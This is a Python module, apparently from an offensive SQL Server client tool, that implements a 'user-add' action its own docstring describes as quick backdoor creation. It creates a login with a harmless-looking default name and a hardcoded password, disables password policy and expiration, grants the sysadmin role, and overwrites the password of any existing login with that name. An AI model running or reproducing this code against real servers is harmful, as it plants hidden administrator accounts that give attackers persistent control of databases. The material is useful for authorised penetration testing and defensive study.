# mssqlclient_ng/core/actions/administration/createuser.py

# Built-in imports
from typing import Optional

# Third party imports
from loguru import logger

# Local library imports
from ..base import BaseAction, Arg
from ..factory import ActionFactory
from ...services.database import DatabaseContext


@ActionFactory.register(
    "user-add", "Create a new SQL Server login with server role privileges"
)
class CreateUser(BaseAction):
    """
    Creates a new SQL Server login with specified server role privileges.

    This action creates a SQL login (not Windows authentication) and assigns
    it to a server role. Default credentials are provided for quick backdoor
    creation, but custom credentials can be specified.
    """

    _username = Arg(position=0, short_name="u", long_name="username", default="backup_usr", description="SQL login username")
    _password = Arg(position=1, short_name="p", long_name="password", default="$ap3rlip0pe//e", description="SQL login password")
    _role = Arg(position=2, short_name="r", long_name="role", default="sysadmin", description="Server role")

    def validate_arguments(self, additional_arguments: str = "") -> None:
        self._bind_arguments(additional_arguments)
        if not self._username or not str(self._username).strip():
            raise ValueError("Username cannot be empty")
        if not self._password or not str(self._password).strip():
            raise ValueError("Password cannot be empty")
        if not self._role or not str(self._role).strip():
            raise ValueError("Role cannot be empty")
        if not additional_arguments or not additional_arguments.strip():
            logger.info(
                f"Using default credentials: {self._username} with role: {self._role}"
            )

    def execute(self, database_context: DatabaseContext) -> Optional[bool]:
        """
        Create a SQL Server login with the specified server role.

        Args:
            database_context: The database context

        Returns:
            True if successful, False otherwise
        """
        # Log the intended operation (avoid leaking sensitive data in higher logs)
        logger.info(f"Creating SQL login: {self._username} with {self._role} role")
        logger.debug(f"Password (raw): '{self._password}'")

        # Escape single quotes in password
        escaped_password = self._password.replace("'", "''")

        create_login_query = f"CREATE LOGIN [{self._username}] WITH PASSWORD = '{escaped_password}', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF;"

        try:
            database_context.query_service.execute_non_processing(
                create_login_query, silent=True
            )
            logger.success(f"SQL login '{self._username}' created successfully")

        except Exception as ex:
            msg = str(ex).lower()
            # If login already exists, update password instead
            if (
                "already exists" in msg
                or "already an object" in msg
                or "create login" in msg
                and "exists" in msg
            ):
                logger.warning(
                    f"SQL login '{self._username}' already exists. Updating password."
                )
                try:
                    alter_query = f"ALTER LOGIN [{self._username}] WITH PASSWORD = '{escaped_password}';"
                    database_context.query_service.execute_non_processing(alter_query)
                    logger.success(f"Password updated for '{self._username}'.")
                except Exception as ex2:
                    logger.error(f"Failed to update password for existing login: {ex2}")
                    return False
            else:
                logger.error(f"Failed to create SQL login: {ex}")
                if "permission" in msg or "denied" in msg:
                    logger.warning(
                        "You may not have sufficient privileges to create logins or assign server roles"
                    )
                return False

        logger.success(f"Password set to: '{self._password}'")

        # Now add the login to the server role
        logger.info(f"Adding '{self._username}' to {self._role} server role")
        add_role_query = (
            f"ALTER SERVER ROLE [{self._role}] ADD MEMBER [{self._username}];"
        )
        try:
            database_context.query_service.execute_non_processing(add_role_query)
            logger.success(
                f"'{self._username}' added to {self._role} role successfully"
            )
            return True
        except Exception as ex:
            msg = str(ex).lower()
            # Already a member
            if "already a member" in msg or "is already a member" in msg:
                logger.info(
                    f"'{self._username}' is already a member of {self._role} role."
                )
                return True

            if "permission" in msg or "denied" in msg:
                logger.error(f"Insufficient privileges: {ex}")
            else:
                logger.error(f"Failed to add user to role: {ex}")

            return False
